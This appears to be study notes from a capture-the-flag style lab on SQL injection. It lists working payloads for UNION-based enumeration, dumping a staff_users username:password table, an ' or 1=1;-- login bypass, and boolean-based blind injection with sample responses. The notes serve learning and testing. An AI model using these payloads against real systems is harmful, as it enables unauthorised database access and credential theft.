![](Pasted%20image%2020241116223725.png)

# [Introduction]

In this case attacker exploit vulnerable input field in the web page to gain access of the database. Attacker inserts SQL command in the input field that interact with the database.
# [Example]

![](Pasted%20image%2020241116225912.png)

![](Pasted%20image%2020241116225956.png)

# SQL Injection Snippets

## Example 0: Check SQL Injection Vulnarability

use `'` or `"` to know if the input field is vulnerable to SQL injection.

## Example 1: In-band SQL Injection (reflected)

```sql
1 UNION SELECT 1
```

- If above gives error add another until success

```sql
0 UNION SELECT 1,2
```

```sql
0 UNION SELECT 1,2,3
```

- Above gives no error so look for database

```sql
0 UNION SELECT 1,2,database()
```

- `sqli_one` is the database name found. Get list of tables

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

- Fond `article,staff_users` tables. Get column from `staff_users`

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

- Found `id,password,username` columns. Let's get username and passwords

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
## Example 2: Blind SQL Injection: Bypass Auth

- Inserting below will result `true` for any input

```sql
' or 1=1;--
```

## Example 3: Blind SQL Injection: Boolean Based

`https://website.thm/checkuser?username=admin` this page returns `{"taken":true}`. For username query parameter we will put below sql snippet.

- Similar to example 1, select 1 if error/fail look for select 1,2 and so one

```sql
admin123' UNION SELECT 1;--
```
```
Response:
{"taken":false}
```

```sql
admin123' UNION SELECT 1,2;--
```
```
Response:
{"taken":false}
```

```sql
admin123' UNION SELECT 1,2,3;--
```
```
Response:
{"taken":true}
```

- Now the response `taken` is `true`, look for database.

```sql
admin123' UNION SELECT 1,2,3 where database() like '%';--
```
```
Response:
{"taken":true}
```

```sql
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```
```
Response:
{"taken":true}
```

- Brute force the name using `database() like 'sa%'` `, database() like 'sa%'`  as the received output is true or false until get  the database name. In this case it is `sqli_three`

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three';--
```
```
Response:
{"taken":true}
```

- Brute force table name until response is true

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

